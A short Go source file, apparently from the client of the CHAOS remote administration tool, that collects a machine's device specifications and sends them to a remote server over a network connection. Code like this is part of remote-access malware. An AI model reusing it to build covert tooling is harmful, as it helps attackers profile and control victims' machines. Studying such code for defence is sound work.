package information

import (
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/models"
	"github.com/tiagorlampert/CHAOS/client/app/usecase"
	"github.com/tiagorlampert/CHAOS/client/app/util"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
	"net"
)

type InformationUseCase struct {
	Connection net.Conn
}

func NewInformationUseCase(conn net.Conn) usecase.Information {
	return &InformationUseCase{
		Connection: conn,
	}
}

func (g InformationUseCase) Collect() {
	info, err := util.PrettyEncode(util.LoadDeviceSpecs())
	if err != nil {
		log.WithField("cause", err.Error()).Fatal("error encoding info")
	}
	if err := network.Send(g.Connection, models.Message{
		Command: "information",
		Data:    info,
	}); err != nil {
		log.WithField("cause", err.Error()).Fatal("error sending info")
	}
}
